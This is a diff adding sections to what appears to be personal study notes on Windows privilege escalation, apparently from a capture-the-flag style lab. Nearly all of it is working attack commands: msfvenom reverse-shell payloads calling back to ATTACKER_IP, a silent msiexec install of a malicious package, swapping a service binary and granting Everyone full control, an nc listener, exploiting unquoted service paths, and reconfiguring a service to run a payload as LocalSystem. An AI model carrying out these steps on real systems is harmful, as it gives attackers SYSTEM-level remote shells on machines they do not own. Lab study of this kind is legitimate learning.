@@ -34,3 +34,35 @@
     msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
 
      msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+
+  #### win service - insecure permission on sercie executable -- msf requied for creating a reverse shell file 
+    sc qc xxx // to check info of a particular service, we'll have the binary file path, the executed accountname.
+    icacls Path:\xxx  //check the privi of this binary file of this serviice
+
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe //create shell file and transfer to the host
+    move C:\Users\thm-unpriv\rev-svc.exe WService.exe  //raap[lace the binary file
+    icacls WService.exe /grant Everyone:F  // grant full privi 
+    nc -nvlp xxxx 
+
+    sc stop xxxservice
+    sc start xxxservice  //restart this service to trigger shell // PowerShell has sc as an alias to Set-Content, therefore you need to use sc.exe in order to control services with PowerShell this way.
+
+  #### win service - Unquoted Service Paths - msf requied for creating a reverse shell file 
+    sc qc "disk sorter enterprise"  
+      DISPLAY_NAME       : Disk Sorter Enterprise  //spaces on the name of the "Disk Sorter Enterprise" folder
+      //SCM doesn't know which of the following you are trying to execute:C:\MyPrograms\Disk.exe plus  Argument1:Sorter plus Argument1:Enterprise\bin\disksrs.exe
+      or C:\MyPrograms\Disk Sorter.exe  plus  Argument1:Enterprise\bin\disksrs.exe
+      or C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
+    we put the revershell file on C:\\MyPrograms\\Disk.exe // we must have write privi to this path
+     //most of the service executables will be installed under C:\Program Files or C:\Program Files (x86)
+    //restart the service and get shell
+
+   #### win service - Insecure Service Permissions -  msf requied for creating a reverse shell file 
+     //check for a service DACL from the command line, you can use Accesschk.exe
+       [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users  //SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service.
+     accesschk64.exe -qlc xxx
+     //generate reversehll file , grant privi,modify config of service 
+     sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem  // localsystem is high privi of a local host.
+     
+    
+    
